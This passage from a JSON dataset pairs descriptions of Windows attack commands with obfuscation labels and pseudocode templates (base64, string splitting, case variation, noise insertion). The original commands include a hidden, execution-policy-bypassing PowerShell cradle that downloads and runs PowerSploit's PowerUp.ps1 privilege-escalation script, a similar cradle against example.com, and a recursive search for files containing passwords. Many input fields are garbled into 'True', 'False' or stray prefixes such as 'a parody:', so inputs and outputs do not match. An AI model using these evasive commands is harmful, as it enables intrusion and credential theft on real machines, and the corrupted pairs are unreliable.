    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Download and execute the PowerUp.ps1 script from the PowerSploit GitHub repository with hidden window and bypassing execution policy.",
    "origin_cmd": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/d943001a7defb5e0d1657085a77a0e78609be58f/Privesc/PowerUp.ps1')\""
  },
  {
    "input": "Download and execute the PowerUp.ps1 script from the PowerSploit GitHub repository with hidden window and bypassing execution policy.",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute the PowerUp.ps1 script from the PowerSploit GitHub repository with hidden window and bypassing execution policy.",
    "origin_cmd": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/d943001a7defb5e0d1657085a77a0e78609be58f/Privesc/PowerUp.ps1')\""
  },
  {
    "input": "Download and execute the PowerUp.ps1 script from the PowerSploit GitHub repository with hidden window and bypassing execution policy.",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Download and execute the PowerUp.ps1 script from the PowerSploit GitHub repository with hidden window and bypassing execution policy.",
    "origin_cmd": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/d943001a7defb5e0d1657085a77a0e78609be58f/Privesc/PowerUp.ps1')\""
  },
  {
    "input": "True",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute the PowerUp.ps1 script from the PowerSploit GitHub repository with hidden window and bypassing execution policy.",
    "origin_cmd": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/d943001a7defb5e0d1657085a77a0e78609be58f/Privesc/PowerUp.ps1')\""
  },
  {
    "input": "False",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Download and execute the PowerUp.ps1 script from the PowerSploit GitHub repository with hidden window and bypassing execution policy.",
    "origin_cmd": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/d943001a7defb5e0d1657085a77a0e78609be58f/Privesc/PowerUp.ps1')\""
  },
  {
    "input": "Download and execute the PowerUp.ps1 script from the PowerSploit GitHub repository with hidden window and bypassing execution policy.",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute the PowerUp.ps1 script from the PowerSploit GitHub repository with hidden window and bypassing execution policy.",
    "origin_cmd": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/d943001a7defb5e0d1657085a77a0e78609be58f/Privesc/PowerUp.ps1')\""
  },
  {
    "input": "Download and execute the PowerUp.ps1 script from the PowerSploit GitHub repository with hidden window and bypassing execution policy.",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Download and execute the PowerUp.ps1 script from the PowerSploit GitHub repository with hidden window and bypassing execution policy.",
    "origin_cmd": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/d943001a7defb5e0d1657085a77a0e78609be58f/Privesc/PowerUp.ps1')\""
  },
  {
    "input": "True",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute the PowerUp.ps1 script from the PowerSploit GitHub repository with hidden window and bypassing execution policy.",
    "origin_cmd": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/d943001a7defb5e0d1657085a77a0e78609be58f/Privesc/PowerUp.ps1')\""
  },
  {
    "input": "False",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Download and execute the PowerUp.ps1 script from the PowerSploit GitHub repository with hidden window and bypassing execution policy.",
    "origin_cmd": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/d943001a7defb5e0d1657085a77a0e78609be58f/Privesc/PowerUp.ps1')\""
  },
  {
    "input": "Download and execute the PowerUp.ps1 script from the PowerSploit GitHub repository with hidden window and bypassing execution policy.",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute the PowerUp.ps1 script from the PowerSploit GitHub repository with hidden window and bypassing execution policy.",
    "origin_cmd": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/d943001a7defb5e0d1657085a77a0e78609be58f/Privesc/PowerUp.ps1')\""
  },
  {
    "input": "Retrieve the names of groups using Windows Management Instrumentation (WMI).",
    "output": "wmic.exe group get name",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Retrieve the names of groups using Windows Management Instrumentation (WMI).",
    "origin_cmd": "wmic.exe group get name"
  },
  {
    "input": "a parody: Retrieve the names of groups using Windows Management Instrumentation (WMI).",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieve the names of groups using Windows Management Instrumentation (WMI).",
    "origin_cmd": "wmic.exe group get name"
  },
  {
    "input": "Adapted from Wikipedia: Retrieve the names of groups using Windows Management Instrumentation (WMI).",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Retrieve the names of groups using Windows Management Instrumentation (WMI).",
    "origin_cmd": "wmic.exe group get name"
  },
  {
    "input": "Retrieve the names of groups using Windows Management Instrumentation (WMI).",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieve the names of groups using Windows Management Instrumentation (WMI).",
    "origin_cmd": "wmic.exe group get name"
  },
  {
    "input": "Retrieve the names of groups using Windows Management Instrumentation (WMI).",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Retrieve the names of groups using Windows Management Instrumentation (WMI).",
    "origin_cmd": "wmic.exe group get name"
  },
  {
    "input": "a parody: Retrieve the names of groups using Windows Management Instrumentation (WMI).",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieve the names of groups using Windows Management Instrumentation (WMI).",
    "origin_cmd": "wmic.exe group get name"
  },
  {
    "input": "Adapted from Wikipedia: Retrieve the names of groups using Windows Management Instrumentation (WMI).",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Retrieve the names of groups using Windows Management Instrumentation (WMI).",
    "origin_cmd": "wmic.exe group get name"
  },
  {
    "input": "Retrieve the names of groups using Windows Management Instrumentation (WMI).",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieve the names of groups using Windows Management Instrumentation (WMI).",
    "origin_cmd": "wmic.exe group get name"
  },
  {
    "input": "Retrieve the names of groups using Windows Management Instrumentation (WMI).",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Retrieve the names of groups using Windows Management Instrumentation (WMI).",
    "origin_cmd": "wmic.exe group get name"
  },
  {
    "input": "a parody: Retrieve the names of groups using Windows Management Instrumentation (WMI).",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieve the names of groups using Windows Management Instrumentation (WMI).",
    "origin_cmd": "wmic.exe group get name"
  },
  {
    "input": "Adapted from Wikipedia: Retrieve the names of groups using Windows Management Instrumentation (WMI).",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Retrieve the names of groups using Windows Management Instrumentation (WMI).",
    "origin_cmd": "wmic.exe group get name"
  },
  {
    "input": "Retrieve the names of groups using Windows Management Instrumentation (WMI).",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieve the names of groups using Windows Management Instrumentation (WMI).",
    "origin_cmd": "wmic.exe group get name"
  },
  {
    "input": "Retrieve the names of groups using Windows Management Instrumentation (WMI).",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Retrieve the names of groups using Windows Management Instrumentation (WMI).",
    "origin_cmd": "wmic.exe group get name"
  },
  {
    "input": "a parody: Retrieve the names of groups using Windows Management Instrumentation (WMI).",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieve the names of groups using Windows Management Instrumentation (WMI).",
    "origin_cmd": "wmic.exe group get name"
  },
  {
    "input": "Adapted from Wikipedia: Retrieve the names of groups using Windows Management Instrumentation (WMI).",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Retrieve the names of groups using Windows Management Instrumentation (WMI).",
    "origin_cmd": "wmic.exe group get name"
  },
  {
    "input": "Retrieve the names of groups using Windows Management Instrumentation (WMI).",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieve the names of groups using Windows Management Instrumentation (WMI).",
    "origin_cmd": "wmic.exe group get name"
  },
  {
    "input": "Download and execute a PowerShell script from a remote URL with bypassing execution policy.",
    "output": "powershell.exe -ExecutionPolicy Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://example.com/script.ps1')\"",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Download and execute a PowerShell script from a remote URL with bypassing execution policy.",
    "origin_cmd": "powershell.exe -ExecutionPolicy Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://example.com/script.ps1')\""
  },
  {
    "input": ": Download and execute a PowerShell script from a remote URL with bypassing execution policy.",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a remote URL with bypassing execution policy.",
    "origin_cmd": "powershell.exe -ExecutionPolicy Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://example.com/script.ps1')\""
  },
  {
    "input": ": Download and execute a PowerShell script with bypassing execution policy. This one: Download and execute a PowerShell script from a remote URL with bypassing execution policy.",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Download and execute a PowerShell script from a remote URL with bypassing execution policy.",
    "origin_cmd": "powershell.exe -ExecutionPolicy Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://example.com/script.ps1')\""
  },
  {
    "input": "Download and execute a PowerShell script from a remote URL with bypassing execution policy.",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a remote URL with bypassing execution policy.",
    "origin_cmd": "powershell.exe -ExecutionPolicy Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://example.com/script.ps1')\""
  },
  {
    "input": "Download and execute a PowerShell script from a remote URL with bypassing execution policy.",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Download and execute a PowerShell script from a remote URL with bypassing execution policy.",
    "origin_cmd": "powershell.exe -ExecutionPolicy Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://example.com/script.ps1')\""
  },
  {
    "input": ": Download and execute a PowerShell script from a remote URL with bypassing execution policy.",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a remote URL with bypassing execution policy.",
    "origin_cmd": "powershell.exe -ExecutionPolicy Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://example.com/script.ps1')\""
  },
  {
    "input": ": Download and execute a PowerShell script with bypassing execution policy. This one: Download and execute a PowerShell script from a remote URL with bypassing execution policy.",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Download and execute a PowerShell script from a remote URL with bypassing execution policy.",
    "origin_cmd": "powershell.exe -ExecutionPolicy Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://example.com/script.ps1')\""
  },
  {
    "input": "Download and execute a PowerShell script from a remote URL with bypassing execution policy.",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a remote URL with bypassing execution policy.",
    "origin_cmd": "powershell.exe -ExecutionPolicy Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://example.com/script.ps1')\""
  },
  {
    "input": "Download and execute a PowerShell script from a remote URL with bypassing execution policy.",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Download and execute a PowerShell script from a remote URL with bypassing execution policy.",
    "origin_cmd": "powershell.exe -ExecutionPolicy Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://example.com/script.ps1')\""
  },
  {
    "input": ": Download and execute a PowerShell script from a remote URL with bypassing execution policy.",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a remote URL with bypassing execution policy.",
    "origin_cmd": "powershell.exe -ExecutionPolicy Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://example.com/script.ps1')\""
  },
  {
    "input": ": Download and execute a PowerShell script with bypassing execution policy. This one: Download and execute a PowerShell script from a remote URL with bypassing execution policy.",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Download and execute a PowerShell script from a remote URL with bypassing execution policy.",
    "origin_cmd": "powershell.exe -ExecutionPolicy Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://example.com/script.ps1')\""
  },
  {
    "input": "Download and execute a PowerShell script from a remote URL with bypassing execution policy.",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a remote URL with bypassing execution policy.",
    "origin_cmd": "powershell.exe -ExecutionPolicy Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://example.com/script.ps1')\""
  },
  {
    "input": "Download and execute a PowerShell script from a remote URL with bypassing execution policy.",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Download and execute a PowerShell script from a remote URL with bypassing execution policy.",
    "origin_cmd": "powershell.exe -ExecutionPolicy Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://example.com/script.ps1')\""
  },
  {
    "input": ": Download and execute a PowerShell script from a remote URL with bypassing execution policy.",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a remote URL with bypassing execution policy.",
    "origin_cmd": "powershell.exe -ExecutionPolicy Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://example.com/script.ps1')\""
  },
  {
    "input": ": Download and execute a PowerShell script with bypassing execution policy. This one: Download and execute a PowerShell script from a remote URL with bypassing execution policy.",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Download and execute a PowerShell script from a remote URL with bypassing execution policy.",
    "origin_cmd": "powershell.exe -ExecutionPolicy Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://example.com/script.ps1')\""
  },
  {
    "input": "Download and execute a PowerShell script from a remote URL with bypassing execution policy.",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a remote URL with bypassing execution policy.",
    "origin_cmd": "powershell.exe -ExecutionPolicy Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://example.com/script.ps1')\""
  },
  {
    "input": "Search for files containing the string \"pass\" in specified file types and recursively list files containing the string \"password.\"",
    "output": "findstr /si pass *.xml *.doc *.txt .xls ; ls -R | select-string -ErrorAction SilentlyContinue -Pattern password",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Search for files containing the string \"pass\" in specified file types and recursively list files containing the string \"password.\"",
    "origin_cmd": "findstr /si pass *.xml *.doc *.txt .xls ; ls -R | select-string -ErrorAction SilentlyContinue -Pattern password"
  },
  {
    "input": "True",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Search for files containing the string \"pass\" in specified file types and recursively list files containing the string \"password.\"",
    "origin_cmd": "findstr /si pass *.xml *.doc *.txt .xls ; ls -R | select-string -ErrorAction SilentlyContinue -Pattern password"
  },
  {
    "input": "False",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Search for files containing the string \"pass\" in specified file types and recursively list files containing the string \"password.\"",
    "origin_cmd": "findstr /si pass *.xml *.doc *.txt .xls ; ls -R | select-string -ErrorAction SilentlyContinue -Pattern password"
  },
  {
    "input": "Search for files containing the string \"pass\" in specified file types and recursively list files containing the string \"password.\"",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Search for files containing the string \"pass\" in specified file types and recursively list files containing the string \"password.\"",
    "origin_cmd": "findstr /si pass *.xml *.doc *.txt .xls ; ls -R | select-string -ErrorAction SilentlyContinue -Pattern password"
  },
  {
    "input": "Search for files containing the string \"pass\" in specified file types and recursively list files containing the string \"password.\"",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Search for files containing the string \"pass\" in specified file types and recursively list files containing the string \"password.\"",
    "origin_cmd": "findstr /si pass *.xml *.doc *.txt .xls ; ls -R | select-string -ErrorAction SilentlyContinue -Pattern password"
  },
  {
    "input": "True",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Search for files containing the string \"pass\" in specified file types and recursively list files containing the string \"password.\"",
    "origin_cmd": "findstr /si pass *.xml *.doc *.txt .xls ; ls -R | select-string -ErrorAction SilentlyContinue -Pattern password"
  },
  {
    "input": "False",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Search for files containing the string \"pass\" in specified file types and recursively list files containing the string \"password.\"",
    "origin_cmd": "findstr /si pass *.xml *.doc *.txt .xls ; ls -R | select-string -ErrorAction SilentlyContinue -Pattern password"
  },
  {
    "input": "Search for files containing the string \"pass\" in specified file types and recursively list files containing the string \"password.\"",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Search for files containing the string \"pass\" in specified file types and recursively list files containing the string \"password.\"",
    "origin_cmd": "findstr /si pass *.xml *.doc *.txt .xls ; ls -R | select-string -ErrorAction SilentlyContinue -Pattern password"
  },
  {
    "input": "Search for files containing the string \"pass\" in specified file types and recursively list files containing the string \"password.\"",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Search for files containing the string \"pass\" in specified file types and recursively list files containing the string \"password.\"",
    "origin_cmd": "findstr /si pass *.xml *.doc *.txt .xls ; ls -R | select-string -ErrorAction SilentlyContinue -Pattern password"
  },
  {
    "input": "True",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Search for files containing the string \"pass\" in specified file types and recursively list files containing the string \"password.\"",
    "origin_cmd": "findstr /si pass *.xml *.doc *.txt .xls ; ls -R | select-string -ErrorAction SilentlyContinue -Pattern password"
  },
  {
    "input": "False",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Search for files containing the string \"pass\" in specified file types and recursively list files containing the string \"password.\"",
    "origin_cmd": "findstr /si pass *.xml *.doc *.txt .xls ; ls -R | select-string -ErrorAction SilentlyContinue -Pattern password"
  },
  {
    "input": "Search for files containing the string \"pass\" in specified file types and recursively list files containing the string \"password.\"",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Search for files containing the string \"pass\" in specified file types and recursively list files containing the string \"password.\"",
    "origin_cmd": "findstr /si pass *.xml *.doc *.txt .xls ; ls -R | select-string -ErrorAction SilentlyContinue -Pattern password"
  },
  {
    "input": "Search for files containing the string \"pass\" in specified file types and recursively list files containing the string \"password.\"",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Search for files containing the string \"pass\" in specified file types and recursively list files containing the string \"password.\"",
    "origin_cmd": "findstr /si pass *.xml *.doc *.txt .xls ; ls -R | select-string -ErrorAction SilentlyContinue -Pattern password"
  },
  {
    "input": "True",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Search for files containing the string \"pass\" in specified file types and recursively list files containing the string \"password.\"",
    "origin_cmd": "findstr /si pass *.xml *.doc *.txt .xls ; ls -R | select-string -ErrorAction SilentlyContinue -Pattern password"
  },
  {
    "input": "False",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Search for files containing the string \"pass\" in specified file types and recursively list files containing the string \"password.\"",
    "origin_cmd": "findstr /si pass *.xml *.doc *.txt .xls ; ls -R | select-string -ErrorAction SilentlyContinue -Pattern password"
  },
  {
    "input": "Search for files containing the string \"pass\" in specified file types and recursively list files containing the string \"password.\"",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Search for files containing the string \"pass\" in specified file types and recursively list files containing the string \"password.\"",
    "origin_cmd": "findstr /si pass *.xml *.doc *.txt .xls ; ls -R | select-string -ErrorAction SilentlyContinue -Pattern password"
  },
  {
    "input": "Start a new PowerShell process with the specified command.",
    "output": "Start-Process ${powershell_command}",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Start a new PowerShell process with the specified command.",
    "origin_cmd": "Start-Process ${powershell_command}"
  },
  {
    "input": "Paraphrase: Start a new PowerShell process with the specified command.",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Start a new PowerShell process with the specified command.",
    "origin_cmd": "Start-Process ${powershell_command}"
  },
  {
    "input": "Start a new PowerShell process with the specified command.",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Start a new PowerShell process with the specified command.",
    "origin_cmd": "Start-Process ${powershell_command}"
  },
  {
    "input": "Paraphrase: Start a new PowerShell process with the specified command.",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Start a new PowerShell process with the specified command.",
    "origin_cmd": "Start-Process ${powershell_command}"
  },
  {
    "input": "Start a new PowerShell process with the specified command.",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Start a new PowerShell process with the specified command.",
    "origin_cmd": "Start-Process ${powershell_command}"
  },
  {
    "input": "Paraphrase: Start a new PowerShell process with the specified command.",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Start a new PowerShell process with the specified command.",
    "origin_cmd": "Start-Process ${powershell_command}"
  },
  {
    "input": "Start a new PowerShell process with the specified command.",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Start a new PowerShell process with the specified command.",
    "origin_cmd": "Start-Process ${powershell_command}"
  },
  {
    "input": "Paraphrase: Start a new PowerShell process with the specified command.",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Start a new PowerShell process with the specified command.",
    "origin_cmd": "Start-Process ${powershell_command}"
  },
  {
    "input": "Start a new PowerShell process with the specified command.",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Start a new PowerShell process with the specified command.",
    "origin_cmd": "Start-Process ${powershell_command}"
  },
  {
    "input": "Paraphrase: Start a new PowerShell process with the specified command.",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Start a new PowerShell process with the specified command.",
    "origin_cmd": "Start-Process ${powershell_command}"
  },
  {
    "input": "Start a new PowerShell process with the specified command.",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Start a new PowerShell process with the specified command.",
    "origin_cmd": "Start-Process ${powershell_command}"
  },
  {
    "input": "Paraphrase: Start a new PowerShell process with the specified command.",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Start a new PowerShell process with the specified command.",
    "origin_cmd": "Start-Process ${powershell_command}"
  },
  {
    "input": "Start a new PowerShell process with the specified command.",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Start a new PowerShell process with the specified command.",
    "origin_cmd": "Start-Process ${powershell_command}"
  },
  {
    "input": "Paraphrase: Start a new PowerShell process with the specified command.",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Start a new PowerShell process with the specified command.",
    "origin_cmd": "Start-Process ${powershell_command}"
  },
  {
    "input": "Start a new PowerShell process with the specified command.",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Start a new PowerShell process with the specified command.",
    "origin_cmd": "Start-Process ${powershell_command}"
  },
  {
    "input": "Paraphrase: Start a new PowerShell process with the specified command.",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Start a new PowerShell process with the specified command.",
